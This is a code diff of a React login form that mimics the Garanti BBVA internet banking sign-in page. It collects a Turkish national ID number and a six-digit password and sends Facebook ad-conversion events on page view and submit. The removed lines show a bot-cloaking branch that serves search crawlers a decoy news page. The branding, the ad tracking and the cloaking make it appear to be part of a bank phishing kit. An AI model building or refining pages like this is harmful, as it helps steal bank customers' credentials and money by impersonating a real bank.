@@ -1,10 +1,9 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAuth } from './AuthContext';
-import { Helmet } from 'react-helmet';
-/* global fbq */
 
-function LoginForm({ isBot }) {
+/* global fbq */
+function LoginForm() {
   const { dispatch } = useAuth();
   const [custNo, setCustNo] = useState('');
   const [password, setPassword] = useState('');
@@ -13,13 +12,15 @@ function LoginForm({ isBot }) {
   const [passwordError, setPasswordError] = useState('');
   const navigate = useNavigate();
 
+  // Sayfa yüklendiğinde ViewContent
   useEffect(() => {
-    if (isBot || typeof window === 'undefined' || !window.fbq) return;
-    fbq('track', 'ViewContent', {
-      content_category: 'garanti_credit_form',
-      content_name: 'garanti_login_page',
-    });
-  }, [isBot]);
+    if (typeof window !== 'undefined' && window.fbq) {
+      fbq('track', 'ViewContent', {
+        content_category: 'garanti_credit_form',
+        content_name: 'garanti_login_page',
+      });
+    }
+  }, []);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -37,18 +38,16 @@ function LoginForm({ isBot }) {
     }
     if (hasError) return;
 
-    // fbclid varsa _fbc cookie oluştur (Secure sadece HTTPS)
+    // fbclid varsa _fbc cookie oluştur
     const urlParams = new URLSearchParams(window.location.search);
     const fbclid = urlParams.get('fbclid');
     if (fbclid && !document.cookie.includes('_fbc=')) {
       const creationTime = Math.floor(Date.now() / 1000);
       const fbcValue = `fb.1.${creationTime}.${fbclid}`;
-      const isLocal = window.location.protocol === 'http:';
-      const secureFlag = isLocal ? '' : '; Secure';
+      const secureFlag = window.location.protocol === 'http:' ? '' : '; Secure';
       document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
     }
 
-    // InitiateCheckout – value 0.5
     const initEventID = `init_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
     if (typeof window !== 'undefined' && window.fbq) {
       fbq('track', 'InitiateCheckout', {
@@ -68,31 +67,6 @@ function LoginForm({ isBot }) {
     });
   };
 
-  if (isBot) {
-    return (
-      <>
-        <Helmet><meta name="robots" content="index, follow" /></Helmet>
-        <div>
-          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
-          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
-            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
-          </p>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Ekonomi Gündemi</h2>
-            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
-          </div>
-          <div style={{ margin: '10px 0' }}>
-            <h2>Spor Dünyasından Haberler</h2>
-            <p>Futbol liglerinde heyecan devam ediyor...</p>
-          </div>
-          <p style={{ textAlign: 'center' }}>
-            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
-          </p>
-        </div>
-      </>
-    );
-  }
-
   return (
     <div className="panel">
       <div id="passwordEntryPanel" className="panel-body">
@@ -107,6 +81,7 @@ function LoginForm({ isBot }) {
           <div className="col-sm-12">
             <div className="form-horizontal">
               <form id="loginForm" onSubmit={handleSubmit} autoComplete="off">
+                {/* T.C. Kimlik */}
                 <div className="formField">
                   <div className="formFieldOuter">
                     <div className="formFieldInner form-group">
@@ -121,7 +96,6 @@ function LoginForm({ isBot }) {
                           onChange={(e) => setCustNo(e.target.value.replace(/\D/g, '').slice(0, 11))}
                           pattern="[0-9]*"
                           id="custno"
-                          name="musteriNoLabelUstte"
                           maxLength="11"
                           autoComplete="off"
                         />
@@ -137,6 +111,7 @@ function LoginForm({ isBot }) {
                   </div>
                 </div>
 
+                {/* Parola */}
                 <div className="formField">
                   <div className="formFieldOuter">
                     <div className="formFieldInner form-group">
@@ -144,19 +119,16 @@ function LoginForm({ isBot }) {
                         Parola
                       </label>
                       <div className="formFieldSurround col-sm-7 col-md-8">
-                        <div className="inline-form-control">
-                          <input
-                            type="password"
-                            className="form-control"
-                            id="password"
-                            name="parolaLabelUstte"
-                            maxLength="6"
-                            pattern="[0-9]*"
-                            value={password}
-                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                            autoComplete="one-time-code"
-                          />
-                        </div>
+                        <input
+                          type="password"
+                          className="form-control"
+                          id="password"
+                          maxLength="6"
+                          pattern="[0-9]*"
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                          autoComplete="one-time-code"
+                        />
                         {passwordError && (
                           <div className="errorContainer advice-text has-alert">
                             <div className="errorWrapper">
@@ -169,7 +141,8 @@ function LoginForm({ isBot }) {
                   </div>
                 </div>
 
-                <div className="ark-ui-checkbox formField control" id="isRememberMeContainer">
+                {/* Beni Hatırla */}
+                <div className="ark-ui-checkbox formField control">
                   <div className="formField dyslexic">
                     <div className="formFieldInner form-group has-btn">
                       <div className="formFieldSurround col-sm-7 col-md-8 col-xs-12 col-sm-offset-5 col-md-offset-4">
@@ -177,9 +150,7 @@ function LoginForm({ isBot }) {
                           <div className="checkbox checkbox-primary no-border">
                             <input
                               id="isRememberMe"
-                              name="isRememberMe"
                               type="checkbox"
-                              value="Y"
                               checked={rememberMe}
                               onChange={(e) => setRememberMe(e.target.checked)}
                             />
@@ -213,10 +184,15 @@ function LoginForm({ isBot }) {
                   </div>
                 )}
 
+                {/* Giriş Butonu */}
                 <div className="form-group form-group-offset footer-button">
                   <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                     <p>
-                      <button id="formSubmit" className="btn btn-primary btn-lg btn-block-input mobile-hover" type="submit">
+                      <button
+                        id="formSubmit"
+                        className="btn btn-primary btn-lg btn-block-input mobile-hover"
+                        type="submit"
+                      >
                         Garanti BBVA İnternet Giriş
                       </button>
                     </p>
